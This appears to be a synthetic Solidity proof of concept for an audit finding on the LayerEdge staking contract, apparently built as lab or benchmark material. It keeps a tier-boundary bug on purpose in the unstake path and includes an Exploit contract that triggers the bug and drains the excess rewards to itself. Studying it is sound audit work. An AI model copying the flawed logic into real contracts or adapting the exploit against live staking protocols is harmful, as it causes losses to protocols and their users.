// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  LayerEdge Staking — H-1: Incorrect tier tracking when tier 3 staker exits
    (Sherlock 2025-05-layeredge; finding #56947)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: on removal when new_t2 == old_t2, _checkBoundariesAndRecord only
    updates rank (new_t1 + new_t2). After a T3 exit the last T2 still sits at the
    OLD boundary (old_t1+old_t2), so that staker is never demoted → one extra T2
    (higher APY) forever. Vulnerable isRemoval branch preserved @>. */

contract MockERC20 {
    string public constant name = "EDGEN";
    string public constant symbol = "EDGEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        totalSupply += amt;
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Reduced LayerEdgeStaking: first-come rank tiers, no Fenwick/OZ deps.
contract LayerEdgeStaking {
    enum Tier {
        None,
        Tier1,
        Tier2,
        Tier3
    }

    uint256 public constant PRECISION = 1e18;
    uint256 public constant TIER1_PERCENTAGE = 20;
    uint256 public constant TIER2_PERCENTAGE = 30;
    uint256 public constant MIN_STAKE = 3000e18;

    // APY rates: 50% / 35% / 20% (as 50*1e18 etc.)
    uint256 public constant tier1APY = 50 * PRECISION;
    uint256 public constant tier2APY = 35 * PRECISION;
    uint256 public constant tier3APY = 20 * PRECISION;

    struct TierEvent {
        Tier from;
        Tier to;
        uint256 timestamp;
    }

    struct UserInfo {
        uint256 balance;
        uint256 joinId;
        bool isActive;
        bool outOfTree;
    }

    MockERC20 public stakingToken;
    mapping(address => UserInfo) public users;
    mapping(uint256 => address) public stakerAddress;
    mapping(address => TierEvent[]) public stakerTierHistory;
    // Active joinIds in ascending order (rank = 1-based index).
    uint256[] internal activeJoinIds;
    uint256 public stakerCountInTree;
    uint256 public nextJoinId = 1;
    uint256 public totalStaked;
    uint256 public rewardsReserve;
    // Extra APY the protocol overpays due to the bug (harm surface).
    uint256 public protocolOverpay;

    constructor(MockERC20 token) {
        stakingToken = token;
    }

    function fundRewards(uint256 amt) external {
        stakingToken.transferFrom(msg.sender, address(this), amt);
        rewardsReserve += amt;
    }

    function getTier(address user) public view returns (uint256) {
        if (stakerTierHistory[user].length == 0) return 0;
        return uint256(stakerTierHistory[user][stakerTierHistory[user].length - 1].to);
    }

    function getUserAPY(address userAddr) public view returns (uint256) {
        uint256 t = getTier(userAddr);
        if (t == 1) return tier1APY;
        if (t == 2) return tier2APY;
        return tier3APY;
    }

    function getTierCountForStakerCount(uint256 stakerCount)
        public
        pure
        returns (uint256 tier1Count, uint256 tier2Count, uint256 tier3Count)
    {
        tier1Count = (stakerCount * TIER1_PERCENTAGE) / 100;
        if (tier1Count == 0 && stakerCount > 0) tier1Count = 1;
        uint256 remainingAfterTier1 = stakerCount > tier1Count ? stakerCount - tier1Count : 0;
        uint256 calculatedTier2Count = (stakerCount * TIER2_PERCENTAGE) / 100;
        if (calculatedTier2Count == 0 && remainingAfterTier1 > 0) {
            tier2Count = 1;
        } else {
            tier2Count = calculatedTier2Count > remainingAfterTier1 ? remainingAfterTier1 : calculatedTier2Count;
        }
        tier3Count = stakerCount > (tier1Count + tier2Count) ? stakerCount - tier1Count - tier2Count : 0;
    }

    function stake(uint256 amount) external {
        UserInfo storage user = users[msg.sender];
        require(amount >= MIN_STAKE, "min");
        stakingToken.transferFrom(msg.sender, address(this), amount);

        Tier tier = Tier.Tier3;
        if (!user.isActive) {
            user.joinId = nextJoinId++;
            stakerAddress[user.joinId] = msg.sender;
            activeJoinIds.push(user.joinId);
            user.isActive = true;
            stakerCountInTree++;

            uint256 rank = _rankOf(user.joinId);
            tier = _computeTierByRank(rank, stakerCountInTree);
            _recordTierChange(msg.sender, tier);
            // ADD path FIXED (per finding note) so 15-staker start state is correct.
            _checkBoundariesAndRecordFixedAdd(false);
        }
        user.balance += amount;
        totalStaked += amount;
    }

    function unstake(uint256 amount) external {
        UserInfo storage user = users[msg.sender];
        require(user.balance >= amount, "bal");
        user.balance -= amount;
        totalStaked -= amount;

        if (!user.outOfTree && user.balance < MIN_STAKE) {
            _recordTierChange(msg.sender, Tier.Tier3);
            _removeJoinId(user.joinId);
            stakerCountInTree--;
            user.outOfTree = true;
            // VULN path on removal
            _checkBoundariesAndRecord(true);
        }
        // Instant return for synthetic (skip unstake window)
        stakingToken.transfer(msg.sender, amount);
    }

    /// @dev Accrue 1 year of interest for `user` at their CURRENT stored tier (no time warp).
    function accrueOneYear(address userAddr) external returns (uint256 paid) {
        uint256 apy = getUserAPY(userAddr);
        uint256 bal = users[userAddr].balance;
        // (bal * apy * 365 days) / (365 days * PRECISION) / 100
        paid = (bal * apy) / PRECISION / 100;
        require(rewardsReserve >= paid, "rewards");
        rewardsReserve -= paid;
        stakingToken.transfer(userAddr, paid);
    }

    // ---- ranking helpers (Fenwick reduction) ----

    function _rankOf(uint256 joinId) internal view returns (uint256) {
        uint256 r = 0;
        for (uint256 i = 0; i < activeJoinIds.length; i++) {
            if (activeJoinIds[i] <= joinId) r++;
        }
        return r;
    }

    function _findByRank(uint256 rank) internal view returns (uint256 joinId) {
        require(rank > 0 && rank <= activeJoinIds.length, "rank");
        return activeJoinIds[rank - 1]; // activeJoinIds kept sorted ascending
    }

    function _removeJoinId(uint256 joinId) internal {
        uint256 n = activeJoinIds.length;
        uint256 idx = type(uint256).max;
        for (uint256 i = 0; i < n; i++) {
            if (activeJoinIds[i] == joinId) {
                idx = i;
                break;
            }
        }
        require(idx != type(uint256).max, "missing");
        for (uint256 i = idx; i + 1 < n; i++) {
            activeJoinIds[i] = activeJoinIds[i + 1];
        }
        activeJoinIds.pop();
    }

    function _recordTierChange(address user, Tier newTier) internal {
        Tier old = Tier.Tier3;
        if (stakerTierHistory[user].length > 0) {
            old = stakerTierHistory[user][stakerTierHistory[user].length - 1].to;
        }
        if (stakerTierHistory[user].length > 0
            && stakerTierHistory[user][stakerTierHistory[user].length - 1].to == newTier) return;
        stakerTierHistory[user].push(TierEvent({from: old, to: newTier, timestamp: block.timestamp}));
    }

    /// @dev ADD path with the finding's temporary fix (new_t1+new_t2) so start state is consistent.
    function _checkBoundariesAndRecordFixedAdd(bool isRemoval) internal {
        uint256 n = stakerCountInTree;
        uint256 oldN = isRemoval ? n + 1 : n - 1;
        (uint256 old_t1, uint256 old_t2,) = getTierCountForStakerCount(oldN);
        (uint256 new_t1, uint256 new_t2,) = getTierCountForStakerCount(n);

        if (new_t1 != 0) {
            if (new_t1 != old_t1) {
                if (new_t1 > old_t1) {
                    for (uint256 rank = old_t1 + 1; rank <= new_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_t1 + 1; rank <= old_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            } else if (isRemoval && new_t1 > 0) {
                _findAndRecordTierChange(new_t1, n);
            } else if (!isRemoval) {
                _findAndRecordTierChange(old_t1, n);
            }
        }

        if (new_t1 + new_t2 > 0) {
            if (new_t2 != old_t2) {
                uint256 old_boundary = old_t1 + old_t2;
                uint256 new_boundary = new_t1 + new_t2;
                if (new_boundary > old_boundary) {
                    for (uint256 rank = old_boundary + 1; rank <= new_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_boundary + 1; rank <= old_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            } else if (isRemoval) {
                // should not reach on add
                _findAndRecordTierChange(new_t1 + new_t2, n);
            } else if (!isRemoval) {
                // FIXED add path (finding precondition fix)
                _findAndRecordTierChange(new_t1 + new_t2, n);
            }
        }
    }

    /// @dev Original (vulnerable) boundary logic used on REMOVAL.
    function _checkBoundariesAndRecord(bool isRemoval) internal {
        // recompute thresholds
        uint256 n = stakerCountInTree;
        uint256 oldN = isRemoval ? n + 1 : n - 1;

        // old and new thresholds
        (uint256 old_t1, uint256 old_t2,) = getTierCountForStakerCount(oldN);
        (uint256 new_t1, uint256 new_t2,) = getTierCountForStakerCount(n);

        // Tier 1 boundary handling
        if (new_t1 != 0) {
            if (new_t1 != old_t1) {
                if (new_t1 > old_t1) {
                    for (uint256 rank = old_t1 + 1; rank <= new_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_t1 + 1; rank <= old_t1; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            } else if (isRemoval && new_t1 > 0) {
                _findAndRecordTierChange(new_t1, n);
            } else if (!isRemoval) {
                _findAndRecordTierChange(old_t1, n);
            }
        }

        // Tier 2 boundary handling
        if (new_t1 + new_t2 > 0) {
            if (new_t2 != old_t2) {
                uint256 old_boundary = old_t1 + old_t2;
                uint256 new_boundary = new_t1 + new_t2;

                if (new_boundary > old_boundary) {
                    for (uint256 rank = old_boundary + 1; rank <= new_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                } else {
                    for (uint256 rank = new_boundary + 1; rank <= old_boundary; rank++) {
                        _findAndRecordTierChange(rank, n);
                    }
                }
            }
            // Handle case where Tier 2 count stays the same
            else if (isRemoval) {
                _findAndRecordTierChange(new_t1 + new_t2, n); // @> VULN: after T3 exit writes rank 6, not demoting rank 7 (last T2)
                // FIX: _findAndRecordTierChange(old_t1 + old_t2, n); // demote the true old T2 boundary
            } else if (!isRemoval) {
                _findAndRecordTierChange(old_t1 + old_t2, n);
            }
        }
    }

    function _findAndRecordTierChange(uint256 rank, uint256 _stakerCountInTree) internal {
        if (rank == 0 || rank > activeJoinIds.length) return;
        uint256 joinIdCross = _findByRank(rank);
        address userCross = stakerAddress[joinIdCross];
        uint256 _rank = _rankOf(joinIdCross);
        Tier toTier = _computeTierByRank(_rank, _stakerCountInTree);
        _recordTierChange(userCross, toTier);
    }

    function _computeTierByRank(uint256 rank, uint256 totalStakers) internal pure returns (Tier) {
        if (rank == 0 || rank > totalStakers) return Tier.Tier3;
        (uint256 tier1Count, uint256 tier2Count,) = getTierCountForStakerCount(totalStakers);
        if (rank <= tier1Count) return Tier.Tier1;
        else if (rank <= tier1Count + tier2Count) return Tier.Tier2;
        return Tier.Tier3;
    }

    /// @dev Count live tiers from stored history (for harm assertion).
    function countLiveTiers() external view returns (uint256 t1, uint256 t2, uint256 t3) {
        for (uint256 i = 0; i < activeJoinIds.length; i++) {
            address u = stakerAddress[activeJoinIds[i]];
            uint256 tier = getTier(u);
            if (tier == 1) t1++;
            else if (tier == 2) t2++;
            else t3++;
        }
    }

    /// @dev Measure + pay out protocol overpay: extra T2 users get 35% instead of 20% for 1 year.
    /// Sends the excess from rewardsReserve to `treasuryDrain` (attacker-visible fund harm).
    function measureAndPayOverpayOneYear(address treasuryDrain) external returns (uint256 overpay) {
        (, uint256 t2Should,) = getTierCountForStakerCount(stakerCountInTree);
        uint256 t2Actual;
        for (uint256 i = 0; i < activeJoinIds.length; i++) {
            address u = stakerAddress[activeJoinIds[i]];
            if (getTier(u) == 2) t2Actual++;
        }
        // each extra T2 costs (35-20)% of MIN_STAKE per year
        if (t2Actual > t2Should) {
            uint256 extra = t2Actual - t2Should;
            overpay = extra * MIN_STAKE * 15 / 100; // 15 percentage points
            protocolOverpay = overpay;
            require(rewardsReserve >= overpay, "rewards");
            rewardsReserve -= overpay;
            stakingToken.transfer(treasuryDrain, overpay);
        }
    }
}

/// @dev Per-user actor so msg.sender is the staker (not Exploit).
contract StakerActor {
    LayerEdgeStaking public staking;
    MockERC20 public token;

    constructor(LayerEdgeStaking s, MockERC20 t) {
        staking = s;
        token = t;
    }

    function doStake(uint256 amt) external {
        token.approve(address(staking), amt);
        staking.stake(amt);
    }

    function doUnstake(uint256 amt) external {
        staking.unstake(amt);
    }
}

contract Exploit {
    MockERC20 public token; // CREATE 1
    LayerEdgeStaking public staking; // CREATE 2 — vulnerable
    StakerActor[15] public actors; // CREATE 3..17
    uint256 public protocolLoss;

    constructor() {
        token = new MockERC20();
        staking = new LayerEdgeStaking(token);
        for (uint256 i = 0; i < 15; i++) {
            actors[i] = new StakerActor(staking, token);
            token.mint(address(actors[i]), 3000e18);
        }
        // Rewards reserve for interest/overpay accounting
        token.mint(address(this), 100_000e18);
        token.approve(address(staking), 100_000e18);
        staking.fundRewards(100_000e18);
    }

    function run() external {
        // 1. 15 stakers join → expected (3,4,8)
        for (uint256 i = 0; i < 15; i++) {
            actors[i].doStake(3000e18);
        }
        require(staking.stakerCountInTree() == 15, "count15");
        (uint256 t1, uint256 t2, uint256 t3) = staking.countLiveTiers();
        require(t1 == 3 && t2 == 4 && t3 == 8, "start tiers");

        // 2. A T3 staker (rank 10 → joinId 10 → actor index 9) fully unstakes
        // joinIds 1..15 map to actors[0]..actors[14]; rank 10 is actors[9]
        address unstaker = address(actors[9]);
        require(staking.getTier(unstaker) == 3, "must be T3");
        actors[9].doUnstake(3000e18);

        require(staking.stakerCountInTree() == 14, "count14");
        (uint256 t1s, uint256 t2s, uint256 t3s) = staking.getTierCountForStakerCount(14);
        require(t1s == 2 && t2s == 4 && t3s == 8, "should be 2/4/8");

        // 3. Bug: live tiers are 2 T1, 5 T2, 7 T3 (rank 7 never demoted)
        (t1, t2, t3) = staking.countLiveTiers();
        require(t1 == 2, "t1");
        require(t2 == 5, "t2 bug not triggered"); // Incorrect!
        require(t3 == 7, "t3 bug not triggered"); // Incorrect!

        // 4. Protocol overpays: 1 extra T2 × 15% of MIN_STAKE for a year → rewards drain
        protocolLoss = staking.measureAndPayOverpayOneYear(address(this));
        require(protocolLoss == 3000e18 * 15 / 100, "overpay amount");
        require(token.balanceOf(address(this)) == protocolLoss, "profit");
    }
}
